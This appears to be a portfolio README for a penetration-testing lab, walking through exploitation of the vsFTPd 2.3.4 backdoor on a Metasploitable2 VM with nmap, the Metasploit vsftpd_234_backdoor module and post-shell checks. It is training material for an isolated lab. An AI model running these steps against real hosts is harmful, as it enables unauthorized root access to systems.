# 🛠️ Penetration Testing Lab Portfolio

Welcome to my hands-on penetration testing repository. This collection of exploit walkthroughs and screenshots showcases my practical skills in identifying, exploiting, and documenting vulnerabilities using tools like:

- Kali Linux  
- Metasploit  
- Nmap  
- Netcat  
- Manual exploitation techniques

---

## 📁 Included Labs

- ✅ [vsFTPd 2.3.4 Backdoor](vsftpd-234-backdoor/)
- ⏳ Samba trans2 buffer overflow *(coming soon)*
- ⏳ TWiki remote code execution *(coming soon)*

---

## 🎯 Goal

To demonstrate real-world offensive security techniques using isolated test environments and vulnerable systems.

---

## 📂 vsFTPd 2.3.4 Backdoor

### 🔍 Vulnerability Summary

`vsFTPd 2.3.4` is a version of the Very Secure FTP Daemon that was distributed with a malicious backdoor. The backdoor is triggered when a username ends with a smiley face `:)`.

---

### 🧭 Nmap Scan

```bash
nmap -A -T4 192.168.56.101
```

📸 [View Nmap Scan Screenshot](vsftpd-234-backdoor/screenshots/nmap_metasploitable_scan_screenshot.png)

---

### 🚀 Exploitation Steps

**1. Open Metasploit**  
```bash
msfconsole
```

**2. Load the backdoor module**  
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

**3. Set the target**  
```bash
set RHOSTS 192.168.56.101
```

**4. Run the exploit**  
```bash
run
```

**5. Shell session opens. Verify it:**  
```bash
whoami
id
uname -a
ls /home
```

📸 [View Shell Access Screenshot](vsftpd-234-backdoor/screenshots/shell_access.png)

---

## 📌 Notes

- This exploit is reliable and results in a root shell on Metasploitable2.  
- Ensure both VMs are on the same **Host-Only Adapter** for proper isolation.  
- Screenshots are located in `vsftpd-234-backdoor/screenshots/`

---

## 🧪 Future Labs (Coming Soon)

- ⏳ Samba trans2 buffer overflow  
- ⏳ TWiki remote code execution  
- ⏳ Netcat reverse shell exercise

